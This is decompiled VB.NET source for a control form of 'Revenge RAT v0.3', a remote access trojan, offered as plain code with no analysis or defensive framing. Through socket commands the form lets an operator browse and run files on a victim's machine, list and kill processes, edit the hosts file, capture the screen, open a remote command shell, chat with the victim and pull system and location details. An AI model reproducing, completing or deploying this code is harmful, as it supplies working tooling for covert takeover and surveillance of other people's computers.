Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports RevengeRAT.My
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Speed_Control
    Public Info As String
    Public Path As String
    Public Sock As Integer
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If (Me.Button1.Text = "Refresh") Then
            Me.Button1.Enabled = False
            My.Forms.Main.s.Send(Me.Sock, "RHS")
            Me.TextBox1.Enabled = False
        Else
            Me.Button1.Text = "Refresh"
            Me.Button1.Enabled = True
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("WHS" & My.Forms.Main.Key), SocketServer.Encode(Me.TextBox1.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If (Me.Button2.Text = "Start") Then
            Me.Button2.Text = "Stop"
            My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"SC", My.Forms.Main.Key, Conversions.ToString(Me.Size.Width), My.Forms.Main.Key, Conversions.ToString(Me.Size.Height)}))
        Else
            My.Forms.Main.s.Send(Me.Sock, "ST")
            Me.Button2.Text = "Start"
        End If
    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Dim strArray As String() = Strings.Split(Me.ComboBox1.Items.Item(Me.ComboBox1.SelectedIndex).ToString, " - ", -1, CompareMethod.Binary)
        Me.Label1.Text = strArray(0)
        Me.Fxlsv2.Items.Clear()
        Me.Fxlsv2.Enabled = False
        Me.ComboBox1.Enabled = False
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("GDFD" & My.Forms.Main.Key), SocketServer.Encode(Me.Label1.Text))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
    End Sub

    Private Sub Commands_KeyDown(sender As Object, e As KeyEventArgs) Handles Commands.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            Dim commands As TextBox = Me.Commands
            Dim text As String = commands.Text
            commands.Text = [text]
            My.Forms.Main.s.Send(Me.Sock, ("WLRS" & My.Forms.Main.Key & Functions.ENB([text])))
            Me.Commands.Clear()
        End If
    End Sub

    Private Sub Fxlsv2_DoubleClick(sender As Object, e As EventArgs) Handles Fxlsv2.DoubleClick
        Dim flagArray As Boolean()
        If (Me.Fxlsv2.SelectedItems.Item(0).SubItems.Item(0).Text = "...") Then
            Me.Label1.Text = Me.Label1.Text.Substring(0, Me.Label1.Text.LastIndexOf("\"))
            Me.Label1.Text = Me.Label1.Text.Substring(0, (Me.Label1.Text.LastIndexOf("\") + 1))
            Me.Fxlsv2.Items.Clear()
            Me.ComboBox1.Enabled = False
            Me.Fxlsv2.Enabled = False
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("GDFD" & My.Forms.Main.Key), SocketServer.Encode(Me.Label1.Text))}
            flagArray = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
            If flagArray(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        ElseIf (Me.Fxlsv2.SelectedItems.Item(0).ImageIndex = 0) Then
            Me.Label1.Text = (Me.Label1.Text & Me.Fxlsv2.SelectedItems.Item(0).SubItems.Item(0).Text & "\")
            Me.Fxlsv2.Items.Clear()
            Me.ComboBox1.Enabled = False
            Me.Fxlsv2.Enabled = False
            Dim objArray As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("GDFD" & My.Forms.Main.Key), SocketServer.Encode(Me.Label1.Text))}
            flagArray = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
            If flagArray(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
            End If
            Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub Fxtrv1_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles Fxtrv1.AfterSelect
        If (Me.TextBox4.Text <> Nothing) Then
            File.WriteAllText((Me.Path & "\Note.txt"), Me.TextBox4.Text)
        End If
        If ((Me.Fxtrv1.SelectedNode.Text <> "Surveillance") AndAlso (Me.Fxtrv1.SelectedNode.Text <> "Fun")) Then
            Me.TabControl1.TabPages.Clear()

            If (Me.Fxtrv1.SelectedNode.Text = "Manager") Then
                Me.TabControl1.TabPages.Add(Me.TabPage1)
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "File Manager") Then
                Me.TabControl1.TabPages.Add(Me.TabPage2)
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "Process Manager") Then
                Me.TabControl1.TabPages.Add(Me.TabPage3)
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "Hosts File Manager") Then
                Me.TabControl1.TabPages.Add(Me.TabPage4)
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "Screen Capture") Then
                Me.TabControl1.TabPages.Add(Me.TabPage5)
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "Command Prompt") Then
                Me.TabControl1.TabPages.Add(Me.TabPage6)
                My.Forms.Main.s.Send(Me.Sock, "OpenRemoteShell")
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "Chat") Then
                Me.TabControl1.TabPages.Add(Me.TabPage7)
                Me.TextBox2.Text = ""
                My.Forms.Main.s.Send(Me.Sock, "OFC")
            ElseIf (Me.Fxtrv1.SelectedNode.Text = "Notes") Then
                Me.TabControl1.TabPages.Add(Me.TabPage8)
                Me.TextBox4.Text = ""
                If File.Exists((Me.Path & "\Note.txt")) Then
                    Me.TextBox4.Text = File.ReadAllText((Me.Path & "\Note.txt"))
                End If
            End If
            If (Me.Fxtrv1.SelectedNode.Text <> "Command Prompt") Then
                My.Forms.Main.s.Send(Me.Sock, "RSEX")
                Me.ResultCMD.Text = Nothing
            End If
            If (Me.Fxtrv1.SelectedNode.Text <> "Chat") Then
                Me.TextBox2.Text = Nothing
                My.Forms.Main.s.Send(Me.Sock, "CLF")
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem2.Click
        My.Forms.Main.s.Send(Me.Sock, "GINFO")
        Me.Fxlsv1.Enabled = False
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
    End Sub

    Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Fxlsv2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("Run" & My.Forms.Main.Key), SocketServer.Encode((Me.Label1.Text & current.SubItems.Item(0).Text)))}
                Dim copyBack As Boolean() = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                If copyBack(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
                Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
            Loop
        Finally
        End Try
    End Sub

    Public Function Enterr(ByVal Info As String) As Object
        Try
            Dim array As String() = Strings.Split(Conversions.ToString(SocketServer.Decode(Info)), "|_|", -1, CompareMethod.Binary)
            Me.Fxlsv1.Items(1).SubItems(1).Text = array(0)
            Me.Fxlsv1.Items(2).SubItems(1).Text = array(1)
            Me.Fxlsv1.Items(3).SubItems(1).Text = array(2)
            Me.Fxlsv1.Items(4).SubItems(1).Text = array(3)
            Me.Fxlsv1.Items(5).SubItems(1).Text = array(4)
            Me.Fxlsv1.Items(6).SubItems(1).Text = My.Forms.Main.GeoIP.LookupCountryName(My.Forms.Main.s.IP(Me.Sock))
            Me.Fxlsv1.Items(7).SubItems(1).Text = array(5)
            Me.Fxlsv1.Items(10).SubItems(1).Text = array(6)
            Me.Fxlsv1.Items(11).SubItems(1).Text = array(7)
            Me.Fxlsv1.Items(12).SubItems(1).Text = array(8)
            Me.Fxlsv1.Items(15).SubItems(1).Text = SocketServer.GetSize(Conversions.ToULong(array(9)))
            Me.Fxlsv1.Items(16).SubItems(1).Text = SocketServer.GetSize(Conversions.ToULong(array(10)))
            Me.Fxlsv1.Items(17).SubItems(1).Text = SocketServer.GetSize(Conversions.ToULong(array(11)))
            Me.Fxlsv1.Items(18).SubItems(1).Text = SocketServer.GetSize(Conversions.ToULong(array(12)))
            Me.Fxlsv1.Items(19).SubItems(1).Text = SocketServer.GetSize(Conversions.ToULong(array(13)))
            Me.Fxlsv1.Items(20).SubItems(1).Text = SocketServer.GetSize(Conversions.ToULong(array(14)))
            Me.Text = Me.Text.Replace("@Machine", "@" + Me.Fxlsv1.Items(3).SubItems(1).Text)
            Me.Fxtrv1.ExpandAll()
            Me.Fxlsv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Dim result As Object
            Return result
        Catch ex As Exception

        End Try

    End Function

    Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim dialog As New SaveFileDialog
        dialog.Filter = "Information|*.txt"
        dialog.FileName = "Information"
        If (dialog.ShowDialog = DialogResult.OK) Then
            Dim enumerator As IEnumerator
            Dim contents As String = String.Empty
            Try
                enumerator = Me.Fxlsv1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Try
                        contents = (contents & current.SubItems.Item(0).Text)
                        Try
                            contents = (contents & " : " & current.SubItems.Item(1).Text)
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            ProjectData.ClearProjectError()
                        End Try
                        contents = (contents & ChrW(13) & ChrW(10))
                    Catch exception2 As Exception
                        ProjectData.SetProjectError(exception2)
                        ProjectData.ClearProjectError()
                    End Try
                Loop
            Finally
            End Try
            If (contents <> Nothing) Then
                File.WriteAllText(dialog.FileName, contents)
                MessageBox.Show(("Information have been Saved successfully at: " & dialog.FileName & "!"), "Successfully!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            End If
        End If
    End Sub

    Private Sub Speed_Control_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Main.s.Send(Me.Sock, "RSEX")
        My.Forms.Main.s.Send(Me.Sock, "CLF")
        My.Forms.Main.s.Send(Me.Sock, "ST")
    End Sub

    Private Sub Speed_Control_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.TabControl1.TabPages.Clear()
        Me.TabControl1.TabPages.Add(Me.TabPage1)
        Me.Enterr(Me.Info)
    End Sub

    Private Sub TextBox3_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox3.KeyDown
        If ((e.KeyCode = Keys.Enter) AndAlso (Me.TextBox3.Text.Length > 0)) Then
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("WTX" & My.Forms.Main.Key), SocketServer.Encode(Me.TextBox3.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.TextBox2.AppendText(("Admin : " & Me.TextBox3.Text & ChrW(13) & ChrW(10)))
            Me.TextBox3.Clear()
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        If (Me.Label1.Text.Length > 0) Then
            Me.Fxlsv2.Items.Clear()
            Me.ComboBox1.Enabled = False
            Me.Fxlsv2.Enabled = False
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("GDFD" & My.Forms.Main.Key), SocketServer.Encode(Me.Label1.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Me.Fxlsv3.Items.Clear()
        Me.Fxlsv3.Enabled = False
        My.Forms.Main.s.Send(Me.Sock, "GPR")
        Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.Fxlsv3.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                My.Forms.Main.s.Send(Me.Sock, ("KLPRO" & My.Forms.Main.Key & current.SubItems.Item(1).Text))
                Me.ToolStripStatusLabel1.Text = "Please wait a moment ..."
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
End Class